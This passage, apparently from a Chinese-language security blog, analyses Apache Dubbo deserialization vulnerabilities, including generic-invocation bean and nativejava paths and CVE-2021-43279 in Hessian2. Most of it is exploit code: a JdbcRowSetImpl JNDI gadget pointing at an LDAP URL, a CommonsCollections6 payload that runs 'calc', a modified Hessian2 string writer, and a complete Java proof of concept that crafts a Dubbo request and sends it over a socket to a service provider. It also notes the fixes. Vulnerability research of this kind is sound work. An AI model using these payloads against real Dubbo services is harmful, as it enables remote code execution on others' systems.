                    while(var15.hasNext()) {
                        Entry entry = (Entry)var15.next();
                        String property = entry.getKey().toString();
                        value = entry.getValue();
                        if (value != null) {
                            if (value instanceof JavaBeanDescriptor) {
                                valueDescriptor = (JavaBeanDescriptor)entry.getValue();
                                value = instantiateForDeserialize(valueDescriptor, loader, cache);
                                deserializeInternal(value, valueDescriptor, loader, cache);
                            }
                            Method method = getSetterMethod(result.getClass(), property, value.getClass());
                            boolean setByMethod = false;
                            try {
                                if (method != null) {
                                    method.invoke(result, value);
                                    setByMethod = true;
                                }
                            } catch (Exception var12) {
                                LogHelper.warn(logger, "Failed to set property through method " + method, var12);
                            }
可以发现会遍历 properties属性，然后反射获取 对应classname实例的setter方法，对属性进行赋值。
利用其实跟上面那种方式差不多，只不过多了一层封装的操作。
    // 泛型调用第三个参数  参数对象
            JavaBeanDescriptor descriptor = new JavaBeanDescriptor("com.sun.rowset.JdbcRowSetImpl",7);
            descriptor.setProperty("class", "com.sun.rowset.JdbcRowSetImpl");
            descriptor.setProperty("dataSourceName", JNDI_URL);
            descriptor.setProperty("autoCommit",true);
            out.writeObject(new Object[]{descriptor});
            // attachment
            HashMap map = new HashMap();
            map.put("generic", "bean");
            out.writeObject(map);
调用栈
    connect:615, JdbcRowSetImpl (com.sun.rowset)
    setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)
    invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
    invoke:62, NativeMethodAccessorImpl (sun.reflect)
    invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
    invoke:498, Method (java.lang.reflect)
    deserializeInternal:282, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)
    deserialize:215, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)
    deserialize:204, JavaBeanSerializeUtil (org.apache.dubbo.common.beanutil)
    invoke:115, GenericFilter (org.apache.dubbo.rpc.filter)
    invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
    invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)
    invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
    invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)
    invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
    reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
    received:152, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
    received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
    received:51, DecodeHandler (org.apache.dubbo.remoting.transport)
    run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
### nativejava
    UnsafeByteArrayInputStream is = new UnsafeByteArrayInputStream((byte[])((byte[])args[i]));
    Throwable var11 = null;
    try {
         args[i] = ((Serialization)ExtensionLoader.getExtensionLoader(Serialization.class).getExtension("nativejava")).deserialize((URL)null, is).readObject();
    public NativeJavaObjectInput(InputStream is) throws IOException {
            this(new ObjectInputStream(is));
        }
        public Object readObject() throws IOException, ClassNotFoundException {
            return this.inputStream.readObject();
        }
其实就是使用原生java反序列化，只不过需要参数是byte数组，下面的代码就是生成一个cc6的序列化payload，
    // 泛型调用第三个参数  参数对象
            byte[] payload = Serializer.serialize(ObjectPayload.Utils.makePayloadObject("CommonsCollections6","calc"));
            out.writeObject(new Object[]{payload});
            // attachment
            HashMap map = new HashMap();
            map.put("generic", "nativejava");
            out.writeObject(map);
    readObject:50, NativeJavaObjectInput (org.apache.dubbo.common.serialize.nativejava)
    invoke:98, GenericFilter (org.apache.dubbo.rpc.filter)
    invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
    invoke:38, ClassLoaderFilter (org.apache.dubbo.rpc.filter)
    invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
    invoke:41, EchoFilter (org.apache.dubbo.rpc.filter)
    invoke:83, ProtocolFilterWrapper$1 (org.apache.dubbo.rpc.protocol)
    reply:145, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
    received:152, DubboProtocol$1 (org.apache.dubbo.rpc.protocol.dubbo)
    received:177, HeaderExchangeHandler (org.apache.dubbo.remoting.exchange.support.header)
    received:51, DecodeHandler (org.apache.dubbo.remoting.transport)
    run:57, ChannelEventRunnable (org.apache.dubbo.remoting.transport.dispatcher)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)
### 修复
前两种攻击的修复，在加载类前都加入验证
都加入了 `SerializeClassChecker.*getInstance*().validateClass(name);`
`CLASS_DESERIALIZE_BLOCKED_SET` 中存在黑名单的验证，封堵了利用链。
对于 nativejava 则从配置文件中判断是否支持Java反序列化，默认为false。
## CVE-2021-43279
### 简述
仍然是默认的 hessian序列化方式，抛出一个非预期的异常时导致了任意代码执行。
### 影响版本
This issue affects Apache Dubbo Apache Dubbo 2.6.x versions prior to 2.6.12;
Apache Dubbo 2.7.x versions prior to 2.7.15; Apache Dubbo 3.0.x versions prior
to 3.0.5.
### 补丁&漏洞分析
直接先从补丁来看
这个commit 的名称是
    Remove toString Calling
修改部分基本如下
主要变动就是删除了隐式的对象的toString调用。
dubbo的默认序列化引擎是 hessian2
，且修复了`src/main/java/com/alibaba/com/caucho/hessian/io/Hessian2Input.java` 中的
`expect`方法，这是最容易被利用的，比如
    org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation#decode(org.apache.dubbo.remoting.Channel, java.io.InputStream)
然后 `readUTF() -> readString() -> except()`
readString 只需要不满足上面的case就可以了。
作者使用的是67，也就是0x43。
构造的话，重写一下`com.alibaba.com.caucho.hessian.io.Hessian2Output#writeString(java.lang.String)`
方法。
    int offset = this._offset;
            byte[] buffer = this._buffer;
            if (4096  32768; strOffset += sublen) {
                    sublen = 32768;
                    offset = this._offset;
                    if (4096 > 8);
                    buffer[offset + 2] = (byte) sublen;
                    this._offset = offset + 3;
                    this.printString(value, strOffset, sublen);
                    length -= sublen;
                }
                offset = this._offset;
                if (4096 > 8));
                    buffer[offset++] = (byte) length;
                } else {
                    buffer[offset++] = 83;
                    buffer[offset++] = (byte) (length >> 8);
                    buffer[offset++] = (byte) length;
                }
                if (!value.startsWith("2.")) {
                    this._offset = offset;
                    this.printString(value, strOffset, length);
                }
            }
        }
然后在后面紧接着writeObject 一个 toString 的Gadgets即可。
但利用比较局限，hessian存在黑名单，老五条被ban掉，然后fastjson版本又是在1.2.70，同样有黑名单的限制。
需要找其他第三方的依赖，且满足Hessian2序列化的规则。
poc
    package org.apache.dubbo.samples.basic;
    import org.apache.dubbo.common.io.Bytes;
    import org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;
    import java.io.ByteArrayOutputStream;
    import java.io.OutputStream;
    import java.net.Socket;
    import java.util.Random;
    public class TestBasicConsumer {
        public static String JNDI_URL = "ldap://127.0.0.1:1389/xxx";
        public static Object payload()throws Exception{
            return new Tests();
        }
        public static void main(String[] args) throws Exception{
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
    // header.
            byte[] header = new byte[16];
    // set magic number.
            Bytes.short2bytes((short) 0xdabb, header);
    // set request and serialization flag.
            header[2] = (byte) ((byte) 0x80 | 2);
    // set request id.
            Bytes.long2bytes(new Random().nextInt(100000000), header, 4);
            ByteArrayOutputStream hessian2ByteArrayOutputStream = new ByteArrayOutputStream();
            Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);
            out.writeUTF("2.0.2");
    //todo 此处填写注册中心获取到的service全限定名、版本号、方法名
            // attachment
            out.writeObject(payload());
            out.flushBuffer();
            Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
            byteArrayOutputStream.write(header);
            byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());
            byte[] bytes = byteArrayOutputStream.toByteArray();
    //todo 此处填写被攻击的dubbo服务提供者地址和端口
            Socket socket = new Socket("127.0.0.1", 20880);
            OutputStream outputStream = socket.getOutputStream();
            outputStream.write(bytes);
            outputStream.flush();
            outputStream.close();
        }
    }